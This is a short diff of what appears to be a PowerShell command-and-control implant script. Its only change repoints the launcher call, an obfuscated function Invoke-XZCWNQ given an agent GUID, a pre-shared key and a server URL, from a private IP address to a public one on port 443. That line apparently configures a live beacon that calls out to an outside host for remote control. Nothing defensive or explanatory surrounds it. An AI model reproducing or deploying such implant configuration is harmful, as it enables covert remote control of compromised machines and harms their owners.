@@ -790,4 +790,4 @@ else {
 
 }
 }
-Invoke-XZCWNQ -Guid 'ec97fc8e-45db-4c08-ba61-d4661f8ec3de' -Psk '701323c3d512533b6aacab291c0316b27e8f5f021ed66d9b6e97fc4be28313e9' -Url 'https://10.80.55.132:443'
+Invoke-XZCWNQ -Guid 'ec97fc8e-45db-4c08-ba61-d4661f8ec3de' -Psk '701323c3d512533b6aacab291c0316b27e8f5f021ed66d9b6e97fc4be28313e9' -Url 'https://52.255.154.38:443'
